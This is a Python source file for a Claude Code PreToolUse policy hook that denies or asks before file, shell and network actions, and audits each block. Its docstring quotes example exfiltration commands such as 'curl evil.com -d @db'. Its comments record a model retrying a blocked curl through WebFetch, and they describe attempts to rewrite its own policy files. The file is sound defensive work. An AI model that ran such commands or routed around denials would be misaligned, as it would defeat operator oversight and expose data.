#!/usr/bin/env python3
"""
claude-env :: Claude Code PreToolUse policy hook
File: hooks/policy_hook.py
Purpose:
    Extend policy enforcement to Claude Code's NATIVE tools (Read, Write, Edit,
    Glob, Grep, NotebookEdit, Bash). The MCP `filesystem-policy` server only
    governs agents that go through MCP; this hook closes the gap so every file
    access in any Claude Code session is policy-checked and audited.

Wiring (done by hooks/install_hooks.py):
    ~/.claude/settings.json -> hooks.PreToolUse:
        matcher: "Read|Write|Edit|NotebookEdit|Glob|Grep|Bash"
        command: $CLAUDE_ENV_HOME/venv/bin/python $CLAUDE_ENV_HOME/hooks/policy_hook.py

Protocol (Claude Code hooks):
    stdin : JSON {session_id, cwd, tool_name, tool_input, ...}
    stdout: empty (allow) OR JSON hookSpecificOutput with permissionDecision
            'deny'/'ask' + reason. Always exit 0 (the decision is in the JSON).

Decisions:
    * incident mode marker present            -> deny EVERYTHING (fail-closed)
    * path matches a policy block rule        -> deny + policy_violation audit
    * Write/Edit content contains a secret    -> ask (operator confirms)
    * Bash command reads/writes a denied path -> deny + policy_violation audit
    * Bash command exfiltrates data (net cmd  -> deny (with a file/secret) else
      + file, or net egress on tier>=2)          ask on tier<=1 for plain egress
    * Bash command string contains a secret   -> ask (operator confirms)
    * otherwise                               -> allow (silent)

Bash gap:
    Native Bash carries its target in a free-form `command` string, not a
    `file_path` key, so `cat secrets/x.env` / `curl evil.com -d @db` would
    otherwise sidestep the path policy and secret scan entirely. We parse the
    command (shlex), extract file-looking arguments + redirection targets, run
    them through the SAME policy engine, and flag network-egress commands. To
    avoid false positives under tier-3 default-deny, bare (slashless) tokens are
    only treated as paths when they actually exist on disk.

Failure posture:
    Internal errors default to ALLOW (so a broken hook cannot brick the editor),
    unless CLAUDE_ENV_HOOK_FAIL_CLOSED=true — recommended for tier 2+ machines.
"""
from __future__ import annotations

import json
import os
import re
import shlex
import sys
import tempfile
from pathlib import Path

HOME = Path(os.environ.get("CLAUDE_ENV_HOME", str(Path.home() / ".claude-env")))
if str(HOME) not in sys.path:
    sys.path.insert(0, str(HOME))
# also allow running from the repo checkout (e.g. during validation)
_REPO = Path(__file__).resolve().parents[1]
if str(_REPO) not in sys.path:
    sys.path.insert(0, str(_REPO))

INCIDENT_MARKER = HOME / "state" / "INCIDENT"
FAIL_CLOSED = os.environ.get("CLAUDE_ENV_HOOK_FAIL_CLOSED", "").lower() == "true"

# Provenance signature prefixed to EVERY deny/ask reason. Without it, a model
# reads a bare "blocked …" string, cannot tell it apart from prompt-injected
# text, classifies the whole control as fake, and tries to route around it
# (observed 2026-07-09: denied `curl` -> retried via WebFetch). A stable,
# self-identifying prefix tells the model this is a real operator-installed
# control, not session content — so it stops and reports instead of evading.
SIGNATURE = ("[claude-env: operator-installed governance control — not session "
             "text; do not attempt to bypass. See `claude-env status`.]")


def _signed(reason: str) -> str:
    """Prefix a decision reason with the operator-control signature (Gap 3)."""
    return f"{SIGNATURE} {reason}"

# File-only (stdout is the hook's decision channel — must stay clean). The hook's
# allow/ask/block decision must never depend on logging succeeding — nor on this
# import succeeding. On a machine where CLAUDE_ENV_HOME is unset/misconfigured
# and lib/ can't be found, fall back to a no-op logger so the module still
# imports and main()'s fail-open/fail-closed guard governs the decision, rather
# than an ImportError crashing Claude Code before main() ever runs.
try:
    from lib.logging_setup import get_logger  # noqa: E402
    _log = get_logger("hooks")
except Exception:  # pragma: no cover - defensive: broken/absent CLAUDE_ENV_HOME
    import logging
    _log = logging.getLogger("claude-env.hooks")
    _log.addHandler(logging.NullHandler())

from security.command_inspector import (  # noqa: E402
    CMD_SEP, FILE_CMDS, NET_CMDS, REDIR, WRITE_CMDS,
    bash_candidates as _bash_candidates,
    bash_write_targets as _bash_write_targets,
    looks_like_path as _looks_like_path,
    shell_tokens as _shell_tokens,
)
# _mutating_reason() references _CMD_SEP directly (not via a function call), so
# it needs the same local-name preservation the `as`-aliased functions above
# get; alias it too so the extraction is behavior-preserving.
_CMD_SEP = CMD_SEP

# Native tools that reach the network. The Bash inspector already gates `curl`/
# `wget`/etc, but these NATIVE tools bypass Bash entirely — so a model whose
# shell egress is denied can otherwise reach the network by switching to them
# (observed 2026-07-09). Requires the install matcher to route them here
# (hooks/install_hooks.py::PRE_MATCHER). Two risk classes:
#   * WebFetch retrieves an arbitrary URL and can POST a body — a data
#     exfiltration vector on par with `curl`. Gated like Bash egress: deny on
#     tier>=2 (network disabled), ASK on tier<=1 (the URL leaves the machine and
#     may carry a body, so the operator confirms each one).
#   * WebSearch only sends a search-query string — it cannot ship file contents
#     out — so it is lower risk. Allowed on tier<=1, denied only at tier>=2 where
#     all egress is off.
_NET_FETCH_TOOLS = {"WebFetch"}
_NET_SEARCH_TOOLS = {"WebSearch"}
_NET_TOOLS = _NET_FETCH_TOOLS | _NET_SEARCH_TOOLS

# tool_input keys that carry a filesystem path, per native tool
_PATH_KEYS = ("file_path", "path", "notebook_path")
# tools whose tool_input carries content being written
_WRITE_CONTENT_KEYS = ("content", "new_string", "new_source")

# MCP-first: native WRITES to these paths are denied and redirected to the MCP
# that owns that domain — so an agent can't sidestep a governed MCP by editing the
# competing native path directly. Enforced only in onboarded repos (where the MCP
# exists); toggle with CLAUDE_ENV_MCP_FIRST=false. First match wins.
_MCP_FIRST = [
    (re.compile(r"(^|/)\.claude/.*/memory/"),
     "record or recall memory via the memory-graph MCP (memory.write / memory.recall) — "
     "do not edit Claude Code's memory files directly"),
]


# Control plane: the files that DEFINE the guardrails. A model must never be
# able to weaken its own enforcement by editing these, so any mutating tool
# (native Write/Edit/NotebookEdit, or a Bash write/redirect/mutation) targeting
# them is hard-denied — regardless of repo allow rules. A human operator still
# edits them by hand or via the `claude-env` CLI (outside the hook path); a
# session may only touch one if the repo policy explicitly lists it under
# `override_deny`. Matched against BOTH the repo-relative path and the resolved
# absolute path, so `~/.claude-env/config/global-policy.yaml` is caught too.
_CONTROL_PLANE = [
    # per-repo control plane (relative form, e.g. ".claude/repo-policy.yaml")
    re.compile(r"(^|/)\.claude/repo-policy\.ya?ml$"),
    re.compile(r"(^|/)\.claude/settings(\.local)?\.json$"),
    # the deployed platform itself ($CLAUDE_ENV_HOME): config, hooks, policy code
    re.compile(r"(^|/)\.claude-env/(config|hooks|security|agents|sql|lib)/"),
    re.compile(r"(^|/)\.claude-env/config/.*\.(ya?ml|json)$"),
]


def _is_control_plane(*path_forms: str) -> bool:
    """True if any given path form (repo-relative and/or absolute) names a
    claude-env control-plane file. Checking multiple forms closes the gap where
    a repo-relative path wouldn't reveal a $CLAUDE_ENV_HOME target."""
    for p in path_forms:
        if not p:
            continue
        norm = p.replace("\\", "/")
        for rx in _CONTROL_PLANE:
            if rx.search(norm):
                return True
    return False


def _mcp_first_hint(rel_path: str) -> str | None:
    """If a native write to `rel_path` should instead go through an MCP, return the
    hint; else None. Off when CLAUDE_ENV_MCP_FIRST=false."""
    if os.environ.get("CLAUDE_ENV_MCP_FIRST", "true").lower() == "false":
        return None
    for rx, hint in _MCP_FIRST:
        if rx.search(rel_path):
            return hint
    return None

# --- Bash command inspection -------------------------------------------------
# Destructive / state-mutating native shell commands. These are HARD-DENIED in the
# hook regardless of path: an agent must not delete/overwrite/change perms/kill via
# raw Bash. Route file edits through the Write/Edit tools and any real command
# through `terminal.run` (which opens a human approval). Additive commands
# (mkdir/touch/cp/ln) are intentionally not here to avoid over-blocking.
_MUTATING_CMDS = {
    "rm", "rmdir", "unlink", "shred", "dd", "mkfs", "truncate",
    "chmod", "chown", "chgrp", "chflags",
    "kill", "pkill", "killall",
}
# git subcommands that delete/rewrite history or mutate the remote.
_GIT_MUTATING = {"push", "reset", "rebase", "clean", "filter-branch", "gc", "prune"}


def _mutating_reason(command: str) -> str | None:
    """Return a reason if the command is a destructive/state-mutating native shell
    command that must be hard-denied, else None."""
    tokens = _shell_tokens(command)
    seg: list[list[str]] = [[]]
    for t in tokens:
        if t in _CMD_SEP:
            seg.append([])
        else:
            seg[-1].append(t)
    for s in seg:
        if not s:
            continue
        cmd = os.path.basename(s[0])
        if cmd in _MUTATING_CMDS:
            return f"state-mutating command '{cmd}'"
        if cmd == "git":
            subs = [t for t in s[1:] if not t.startswith("-")]
            if subs and subs[0] in _GIT_MUTATING:
                return f"state-mutating git subcommand '{subs[0]}'"
            if subs and subs[0] == "commit" and "--amend" in s[1:]:
                return "git commit --amend (history rewrite)"
    return None


def _inspect_bash(command: str, engine, root: Path, cwd: str
                  ) -> tuple[str, str, str] | None:
    """Return (action, reason, denied_path_or_'') for a Bash command, or None.

    action is 'deny' or 'ask'. Precedence: destructive command > denied path >
    exfiltration > plain network egress > secret in the command string.
    """
    # 0. destructive / state-mutating native shell -> hard deny (route via Write/
    #    Edit or terminal.run). A stop, not a nudge — the model can't `rm` here.
    mut = _mutating_reason(command)
    if mut:
        return ("deny",
                f"blocked: {mut}. Native shell must not mutate state — edit files with "
                f"the Write/Edit tools, or run the command through `terminal.run` (which "
                f"opens a human approval). Nothing was run.", "")

    paths, nets = _bash_candidates(command, cwd)

    # 0b. control-plane guard: a Bash command that WRITES into a governance
    #     control-plane file is a guardrail-self-modification attempt (e.g.
    #     `echo 'tier: 0' > .claude/repo-policy.yaml`, `cp x .claude/settings.json`).
    #     Reading these is harmless, so we only inspect write targets: redirect
    #     destinations and the targets of file-writing commands (cp/mv/tee/dd/ln/
    #     install). Hard-deny unless in override_deny. Mirrors the native guard.
    for tok in _bash_write_targets(command, cwd):
        abs_tok = str(Path(os.path.expanduser(tok)).resolve()) \
            if os.path.isabs(os.path.expanduser(tok)) \
            else str((Path(cwd or ".") / tok).resolve())
        rel_tok = _rel_for_policy(abs_tok, root)
        if _is_control_plane(rel_tok, abs_tok) \
                and not engine._match_paths(rel_tok, engine.repo.override_paths):
            return ("deny",
                    f"blocked: command writes a claude-env control-plane file "
                    f"({tok}). A model may not modify its own guardrails "
                    f"(policy / settings / deployed platform). Nothing was run.",
                    rel_tok)

    # 1. any file argument that the policy blocks -> deny (hard)
    #    Control-plane paths are exempt here: reads are harmless (step 0b already
    #    hard-denies writes to them). Without this exemption, `cat repo-policy.yaml`
    #    would be denied because the path is in the policy deny list.
    for tok in paths:
        abs_tok = tok if os.path.isabs(os.path.expanduser(tok)) \
            else str((Path(cwd or ".") / tok))
        rel_tok = _rel_for_policy(abs_tok, root)
        if _is_control_plane(rel_tok, abs_tok):
            continue  # reads of governance files are allowed; writes already blocked above
        decision = engine.evaluate_path(rel_tok)
        if decision.action == "block":
            return ("deny",
                    f"blocked by claude-env policy ({decision.reason}: "
                    f"{decision.rule or tok}) — command touches a protected path",
                    decision.rule or tok)

    # 2. network egress combined with a file argument -> likely exfiltration
    if nets and paths:
        return ("deny",
                f"possible data exfiltration: network command "
                f"({', '.join(sorted(nets))}) with a file argument", "")

    # 3. plain network egress -> deny on tier>=2 (network is disabled there), else ask
    if nets:
        tier = getattr(engine.repo, "tier", 1)
        egress = ", ".join(sorted(nets))
        if tier >= 2:
            return ("deny",
                    f"network egress ({egress}) is not permitted in a tier-{tier} "
                    f"repo — route through an approved channel", "")
        return ("ask",
                f"claude-env: command performs network egress ({egress}) — confirm", "")

    # 4. secret material inline in the command string -> ask
    try:
        from security.detectors import SECRET_PATTERNS
        hits = [n for n, p in SECRET_PATTERNS if re.search(p, command)]
        if hits:
            return ("ask",
                    f"claude-env: command contains secret pattern(s) {hits} — confirm",
                    "")
    except Exception:
        # A failure here silently disables inline-secret screening for this
        # command — worth a warning, but keep the original posture (fall through
        # rather than hard-fail the hook on a detector import/regex error).
        _log.warning("inline secret screening failed; command not screened",
                     exc_info=True)
    return None


def _deny(reason: str) -> None:
    print(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": _signed(reason)}}))


def _ask(reason: str) -> None:
    print(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "ask",
        "permissionDecisionReason": _signed(reason)}}))


def _repo_root(cwd: str) -> Path:
    """Walk up from cwd to the enclosing repo (policy file or .git), else cwd."""
    p = Path(cwd or ".").resolve()
    for cand in (p, *p.parents):
        if (cand / ".claude" / "repo-policy.yaml").exists() or (cand / ".git").exists():
            return cand
    return p


def _rel_for_policy(path_str: str, root: Path) -> str:
    """Path as the policy engine expects: repo-relative when inside the repo,
    otherwise the absolute path with the leading '/' stripped so global
    '**/...' deny globs (e.g. **/.ssh/**) still match."""
    p = Path(os.path.expanduser(path_str))
    if not p.is_absolute():
        return str(p)
    try:
        return str(p.resolve().relative_to(root))
    except ValueError:
        return str(p.resolve()).lstrip("/")


# Out-of-repo read confinement (Gap 2). Policy allow-rules are scoped INSIDE the
# repo and global deny globs only catch known-sensitive names, so a path
# resolving OUTSIDE the onboarded repo root matched nothing and was allowed —
# letting a session read sibling repos, ~/.claude/projects/*, ~/.claude/settings
# .json, etc. We now hard-deny reads whose resolved path is outside the repo,
# except the session scratchpad, where tools legitimately stage intermediate
# working files. The allow-root is the SPECIFIC scratchpad dir (from
# CLAUDE_CODE_SCRATCHPAD / the /tmp/claude-<uid>/… pattern), NOT the whole OS
# temp tree — a blanket temp allow-root would let a repo that happened to live
# under temp be escaped into via `..`. (The deployed platform dir
# $CLAUDE_ENV_HOME is NOT an allow-root — the global deny glob
# `**/.claude-env/**` already blocks it, so a model can't read platform internals.)
def _read_scope_allow_roots() -> list[Path]:
    roots: list[Path] = []
    scratch = os.environ.get("CLAUDE_CODE_SCRATCHPAD") \
        or os.environ.get("CLAUDE_SCRATCHPAD_DIR")
    if scratch:
        roots.append(Path(scratch))
    # Fallback: the harness scratchpad lives under <tmp>/claude-<uid>/… ; allow
    # exactly that subtree (both /tmp and macOS /private/tmp spellings), not the
    # entire temp root.
    uid = os.getuid() if hasattr(os, "getuid") else ""
    for base in (tempfile.gettempdir(), "/tmp", "/private/tmp"):
        roots.append(Path(base) / f"claude-{uid}")
    out: list[Path] = []
    for r in roots:
        try:
            out.append(r.resolve())
        except OSError:
            out.append(r)
    return out


def _is_within(path: Path, root: Path) -> bool:
    try:
        path.resolve().relative_to(root)
        return True
    except (ValueError, OSError):
        return False


def _out_of_repo_read(path_str: str, root: Path) -> bool:
    """True if `path_str` resolves OUTSIDE the onboarded repo and is not in an
    operator-sanctioned allow root — i.e. a cross-repo/system read to hard-deny.
    Read confinement only applies to onboarded repos (those with a repo-policy);
    un-onboarded cwds have no scope to confine to."""
    if not (root / ".claude" / "repo-policy.yaml").exists():
        return False
    p = Path(os.path.expanduser(path_str))
    if not p.is_absolute():
        p = (root / p)
    if _is_within(p, root.resolve()):
        return False
    for allow in _read_scope_allow_roots():
        if _is_within(p, allow):
            return False
    return True


def main() -> int:
    try:
        payload = json.load(sys.stdin)
    except Exception:
        return 0  # malformed input: nothing to decide on

    tool = payload.get("tool_name", "")
    tin = payload.get("tool_input") or {}
    cwd = payload.get("cwd", os.getcwd())
    session = payload.get("session_id", "hook")

    # 1. incident mode: hard stop for every intercepted tool, including Bash.
    if INCIDENT_MARKER.exists():
        try:
            detail = json.loads(INCIDENT_MARKER.read_text()).get("reason", "")
        except Exception:
            detail = ""
        _deny(f"claude-env incident mode is active{': ' + detail if detail else ''}. "
              f"Run 'claude-env incident off' to lift it.")
        return 0

    # 1b. native network tools (WebFetch/WebSearch): gate like Bash egress so a
    #     model can't sidestep the shell egress rules by using the native tool.
    #     deny on tier>=2 (network disabled there), ask on tier<=1.
    if tool in _NET_TOOLS:
        try:
            from security.policy_engine import PolicyEngine
            root = _repo_root(cwd)
            engine = PolicyEngine.load(root)
            tier = getattr(engine.repo, "tier", 1)
        except Exception as exc:
            # Can't resolve tier. Network egress is a hard invariant ("no egress
            # by default"), so unlike the general fail-open posture we do NOT
            # silently allow a net tool on error: fail closed to 'deny' under
            # FAIL_CLOSED, otherwise 'ask' so the operator decides — never a
            # silent allow.
            _log.warning("net-tool gate: policy unavailable for %s, %s: %s",
                         tool, "denying" if FAIL_CLOSED else "asking", exc,
                         exc_info=True)
            if FAIL_CLOSED:
                _deny(f"network tool {tool}: policy unavailable (fail-closed) — {exc}")
            else:
                _ask(f"network tool {tool}: could not verify repo tier — confirm egress")
            return 0
        if tool in _NET_FETCH_TOOLS:
            # WebFetch retrieves an arbitrary URL and can POST a body — a data
            # exfil vector. Hard-deny at tier>=2 (no egress there); ask at tier<=1.
            if tier >= 2:
                _deny(f"native network tool {tool} is not permitted in a tier-{tier} "
                      f"repo (no network egress) — route through an approved channel")
            else:
                _ask(f"{tool} performs network egress (an outbound request that may "
                     f"carry data) — confirm")
        else:
            # WebSearch sends only a query string (no file-exfil vector), so it is
            # not a hard-deny even on sensitive repos: allow silently at tier<=1,
            # and ASK at tier>=2 so a search still can't run unobserved there.
            if tier >= 2:
                _ask(f"{tool} sends a search query off-machine — confirm "
                     f"(tier-{tier} repo)")
            else:
                return 0
        return 0

    # 2. collect the path (if any) this tool call touches
    path_str = next((tin[k] for k in _PATH_KEYS if tin.get(k)), None)
    if not path_str and tool == "Grep":
        path_str = tin.get("path")
    is_bash = tool == "Bash"
    bash_cmd = tin.get("command", "") if is_bash else ""
    if not path_str and not is_bash and tool not in ("Write", "Edit", "NotebookEdit"):
        return 0  # pathless, non-Bash calls: no path policy to apply

    try:
        from security.policy_engine import PolicyEngine
        root = _repo_root(cwd)
        engine = PolicyEngine.load(root)

        # 2a. read confinement: a native path tool reaching OUTSIDE the onboarded
        #     repo (a sibling repo, ~/.claude/projects/*, ~/.claude/settings.json)
        #     is hard-denied. Policy allow-rules are in-repo only and global deny
        #     globs miss most out-of-tree paths, so without this the read surface
        #     is the whole filesystem. Operator allow-roots (scratchpad, tmp,
        #     $CLAUDE_ENV_HOME) are exempted by _out_of_repo_read.
        if path_str and _out_of_repo_read(path_str, root):
            try:
                from audit.audit_logger import AuditLogger
                AuditLogger(session, actor="claude-code", repo=root.name,
                            tier=engine.repo.tier).policy_violation(
                    path_str, "out-of-repo read (cross-repo/system access)",
                    "block", tier=engine.repo.tier)
            except Exception:
                _log.error("failed to audit out-of-repo read block "
                           "(decision still enforced): %s", path_str, exc_info=True)
            _deny(f"read confined to the onboarded repo — {path_str} resolves "
                  f"outside {root}. Cross-repo and system reads are blocked.")
            return 0

        # 2a'. Bash read confinement: same rule for file args a Bash command
        #      touches (`cat ~/.claude/settings.json`). Reuses _bash_candidates so
        #      the parse matches the rest of the Bash inspection. Control-plane
        #      reads are exempt (handled harmlessly by _inspect_bash below).
        if is_bash and bash_cmd.strip():
            cand_paths, _ = _bash_candidates(bash_cmd, cwd)
            for tok in cand_paths:
                if _out_of_repo_read(tok, root):
                    try:
                        from audit.audit_logger import AuditLogger
                        AuditLogger(session, actor="claude-code", repo=root.name,
                                    tier=engine.repo.tier).policy_violation(
                            tok, "out-of-repo read via Bash (cross-repo/system access)",
                            "block", tier=engine.repo.tier)
                    except Exception:
                        _log.error("failed to audit out-of-repo Bash read block "
                                   "(decision still enforced): %s", tok, exc_info=True)
                    _deny(f"read confined to the onboarded repo — the command "
                          f"touches {tok}, which resolves outside {root}. "
                          f"Cross-repo and system reads are blocked.")
                    return 0

        # 2b. Bash: parse the command string and apply policy to its file args
        if is_bash and bash_cmd.strip():
            verdict = _inspect_bash(bash_cmd, engine, root, cwd)
            if verdict:
                action, reason, denied = verdict
                if action == "deny":
                    try:
                        from audit.audit_logger import AuditLogger
                        AuditLogger(session, actor="claude-code", repo=root.name,
                                    tier=engine.repo.tier).policy_violation(
                            denied or bash_cmd[:200], reason, "block",
                            tier=engine.repo.tier)
                    except Exception:
                        # auditing must never break the decision — the deny below
                        # still fires. Log so a broken audit path is not silent.
                        _log.error("failed to audit bash policy_violation "
                                   "(decision still enforced): %s", reason,
                                   exc_info=True)
                    _deny(reason)
                else:
                    _ask(reason)
                return 0

        # 2b'. control-plane guard: a mutating native tool must not edit the files
        #      that define the guardrails (repo policy, Claude settings, deployed
        #      platform config/hooks/policy code). Hard-deny unless the repo policy
        #      explicitly lists the path under override_deny. Fail-closed against a
        #      model rewriting its own enforcement.
        if tool in ("Write", "Edit", "NotebookEdit") and path_str:
            rel_cp = _rel_for_policy(path_str, root)
            abs_cp = str(Path(os.path.expanduser(path_str)).resolve())
            if _is_control_plane(rel_cp, abs_cp) \
                    and not engine._match_paths(rel_cp, engine.repo.override_paths):
                try:
                    from audit.audit_logger import AuditLogger
                    AuditLogger(session, actor="claude-code", repo=root.name,
                                tier=engine.repo.tier).policy_violation(
                        rel_cp, "control-plane write (guardrail self-modification)",
                        "block", tier=engine.repo.tier)
                except Exception:
                    # deny still fires below; just don't let an audit failure
                    # hide a guardrail self-modification attempt.
                    _log.error("failed to audit control-plane write block "
                               "(decision still enforced): %s", rel_cp,
                               exc_info=True)
                _deny("blocked by claude-env: this is a governance control-plane file "
                      "(policy / settings / deployed platform config). A model may not "
                      "modify its own guardrails. A human operator edits these via the "
                      "`claude-env` CLI or directly; to permit a specific path, add it to "
                      "override_deny in .claude/repo-policy.yaml.")
                return 0

        if path_str:
            rel = _rel_for_policy(path_str, root)
            decision = engine.evaluate_path(rel)
            if decision.action == "block":
                try:
                    from audit.audit_logger import AuditLogger
                    AuditLogger(session, actor="claude-code", repo=root.name,
                                tier=engine.repo.tier).policy_violation(
                        rel, decision.rule or decision.reason, "block",
                        tier=engine.repo.tier)
                except Exception:
                    # auditing must never break the decision itself (deny fires
                    # below); log so audit-write faults are diagnosable.
                    _log.error("failed to audit path policy_violation "
                               "(decision still enforced): %s", rel, exc_info=True)
                _deny(f"blocked by claude-env policy ({decision.reason}: "
                      f"{decision.rule or rel})")
                return 0

        # 2c. MCP-first: a native write that belongs to an MCP domain (e.g. Claude
        # Code's memory files vs the memory-graph MCP) is denied and redirected.
        # Only in onboarded repos, where that MCP is actually available.
        if tool in ("Write", "Edit", "NotebookEdit") and path_str \
                and (root / ".claude" / "repo-policy.yaml").exists():
            hint = _mcp_first_hint(_rel_for_policy(path_str, root))
            if hint:
                _deny(f"claude-env: {hint}")
                return 0

        # 3. secret scan on content being written — surface to the operator
        if tool in ("Write", "Edit", "NotebookEdit"):
            content = " ".join(str(tin.get(k, "")) for k in _WRITE_CONTENT_KEYS)
            if content.strip():
                from security.detectors import SECRET_PATTERNS
                import re
                hits = [n for n, p in SECRET_PATTERNS if re.search(p, content)]
                if hits:
                    try:
                        from audit.audit_logger import AuditLogger
                        AuditLogger(session, actor="claude-code",
                                    repo=root.name).security_event(
                            "secret", "high",
                            f"secret pattern in outgoing write: {hits}",
                            source=path_str or tool)
                    except Exception:
                        # _ask still fires below; log the audit-write failure.
                        _log.error("failed to audit secret-in-write security_event "
                                   "(operator still prompted)", exc_info=True)
                    _ask(f"claude-env: content being written matches secret "
                         f"pattern(s) {hits} — confirm this write")
                    return 0
    except Exception as exc:  # engine/DB unavailable
        if FAIL_CLOSED:
            _log.error("policy hook error; failing CLOSED (deny): %s", exc,
                       exc_info=True)
            _deny(f"claude-env policy hook error (fail-closed): {exc}")
        # fail-open: allow, but never silently — a hook that errored and allowed
        # is a governance-relevant event, so leave a trail even though the posture
        # is deliberate.
        _log.warning("policy hook error; failing OPEN (allow) for tool=%s path=%s: %s",
                     tool, path_str or "-", exc, exc_info=True)
        return 0

    return 0  # allow


if __name__ == "__main__":
    raise SystemExit(main())
